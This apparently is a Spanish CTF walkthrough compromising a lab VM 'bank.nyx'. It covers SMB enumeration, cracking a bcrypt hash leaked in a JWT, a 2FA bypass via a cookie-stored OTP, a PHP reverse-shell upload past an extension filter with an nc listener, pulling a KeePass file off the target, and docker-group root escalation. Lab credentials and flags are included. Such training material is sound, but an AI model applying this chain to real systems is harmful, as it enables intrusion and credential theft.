

![](../../Pasted%20image%2020260903164036.png)

**Dominio:** bank.nyx

---

## Reconocimiento

### Ping

```bash
ping -c 3 192.168.6.132
```

```
PING 192.168.6.132 (192.168.6.132) 56(84) bytes of data.
64 bytes from 192.168.6.132: icmp_seq=1 ttl=64 time=1.22 ms
64 bytes from 192.168.6.132: icmp_seq=2 ttl=64 time=0.628 ms
64 bytes from 192.168.6.132: icmp_seq=3 ttl=64 time=0.671 ms
```

### Nmap - SYN scan

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.6.132 -oG allports
```

```
PORT    STATE SERVICE
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

### Nmap - Detección de versiones

```bash
nmap -p80,139,445 -sCV 192.168.6.132 -oN targeted
```

```
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: Did not follow redirect to http://bank.nyx/
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 08:00:27:61:C1:92 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: bank.nyx

Host script results:
| smb2-time:
|   date: 2026-09-03T17:20:33
|_  start_date: N/A
|_nbstat: NetBIOS name: BANK, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
```

**Agregar a /etc/hosts:**

```bash
echo "192.168.6.132 bank.nyx" | sudo tee -a /etc/hosts
```

### Servicios y puertos abiertos

```
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

### Whatweb

```bash
whatweb http://bank.nyx/
```

```
http://bank.nyx/ [200 OK] Apache[2.4.66], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.66 (Debian)], IP[192.168.6.132], Script, Title[Bank Alpha | Welcome]
```

---

## Enumeración SMB

### Conexión anónima

```bash
smbclient -L //bank.nyx/ -N
smbclient //bank.nyx/development -N
```

![](images/Pasted%20image%2020260903133112.png)

Usuario `bank.nyx` con permisos de lectura sobre el recurso `development`. Dentro, archivo `03-may-26.txt`.

![](images/Pasted%20image%2020260903133825.png)

```bash
get 03-may-26.txt
```

Al extraerlo se obtiene un mensaje con un directorio web y tres usuarios: `juan`, `lucas`, `marcelo` (se guardan para más adelante).

![](images/Pasted%20image%2020260903150104.png)

---

## Explotación Web - Panel de usuarios

El directorio filtrado corresponde a un panel de login/registro. Se crea un usuario propio y, al enumerar el panel de verificación de usuarios probando distintos nombres, se confirma la existencia del usuario `admin`.

![](images/Pasted%20image%2020260903150554.png)

Se intercepta la petición con Burp Suite:

![](images/Pasted%20image%2020260903151029.png)

La respuesta entrega una **Cookie con un `auth` en formato JWT**. Se decodifica:

![](images/Pasted%20image%2020260903151043.png)

**Payload expuesto - cuenta admin:**

```
username:admin
password:"$2y$12$X4uppQvzwFCSbVfCH7qF1eNOSA6/cBy/o5sbVcxxdfu/GF7.a0YKi"
```

### Crackeo del hash (bcrypt)

```bash
# Parametro de hash bcrypt
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

```
# Contraseña
$2y$12$X4uppQvzwFCSbVfCH7qF1eNOSA6/cBy/o5sbVcxxdfu/GF7.a0YKi:blink182
```

**Credenciales admin:** `admin:blink182`

### Bypass 2FA

Al loguear con `admin:blink182` aparece un código de doble factor:

![](images/Pasted%20image%2020260903152028.png)

Inspeccionando **Storage → Cookies** se ve otro JWT:

![](images/Pasted%20image%2020260903152913.png)

Se decodifica nuevamente y expone el OTP:

![](images/Pasted%20image%2020260903152231.png)

Con el OTP se accede al panel de administrador:

![](images/Pasted%20image%2020260903153035.png)

---

## RCE vía subida de archivos

Dentro de `My Account` hay un panel para subir foto de perfil. Primer intento: reverse shell PHP de pentestmonkey (`rev.php`), directo:

![](images/Pasted%20image%2020260903153421.png)

**Bypass:** se cambia la extensión a `.png`. El destino de guardado es `uploads/`.


![](images/Pasted%20image%2020260903154225.png)
![](images/Pasted%20image%2020260903154319.png)

Se accede a `rev.php` desde `uploads/` mientras se tiene el listener activo:

```bash
nc -lvnp 8000
```

Shell obtenida como `www-data`.

---

## Enumeración post-explotación (www-data)

```bash
# Permisos sudo
sudo -l
```

```bash
# Permisos SUID
find / -perm -4000 -type f 2>/dev/null
```

```bash
# Tareas cron
cat /etc/crontab
ls -la /etc/cron.*
```

Sin sudo, SUID estándar, sin cron relevante. Revisando la carpeta local del recurso SMB aparece lo que no era visible por red: una nota con una contraseña.

![](images/Pasted%20image%2020260903155436.png)

### Exfiltración

```bash
# En el target
python3 -m http.server 9999
```

![](images/Pasted%20image%2020260903155716.png)

```bash
# En atacante
wget http://192.168.6.132:9999/passwords.kdbx
```

### Apertura con KeePassXC

```bash
keepassxc passwords.kdbx
```

![](images/Pasted%20image%2020260903160253.png)

**Credenciales obtenidas:**

```
juan:j2uan#21eIlLo!76
lucas:lUc4s!62edfgl0o6
marcelo:m4rC1!#asl2#vsHj4!
```

---

## Movimiento lateral

Sin información relevante dentro de las cuentas, se prueba conexión usuario a usuario:

![](images/Pasted%20image%2020260903161034.png)

`marcelo` pertenece al grupo `docker` → indicio de escalada de privilegios vía docker.

### user.txt

![](images/Pasted%20image%2020260903161236.png)

```
52728f2b72b6a153a415d8b738450fa3
```

---

## Escalada de privilegios - Docker group

```bash
docker images
```

![](images/Pasted%20image%2020260903161309.png)

Imagen disponible. Se monta:

![](images/Pasted%20image%2020260903161633.png)

### root.txt

```
e8bd8213ff4f6b805dec9068fd35db44
```

---

## Resumen del ataque

1. SMB anónimo → credenciales/usuarios filtrados en archivo `.txt`.
2. Panel web → JWT filtra hash bcrypt de `admin`.
3. Hashcat crackea bcrypt (rockyou) → `blink182`.
4. 2FA bypass vía JWT en cookie de sesión → OTP expuesto.
5. Upload de reverse shell (bypass de extensión `.php`→`.png`) → RCE como `www-data`.
6. Archivo `.kdbx` local en ruta del recurso SMB → credenciales de `juan`, `lucas`, `marcelo`.
7. `marcelo` en grupo `docker` → montaje de imagen disponible → root.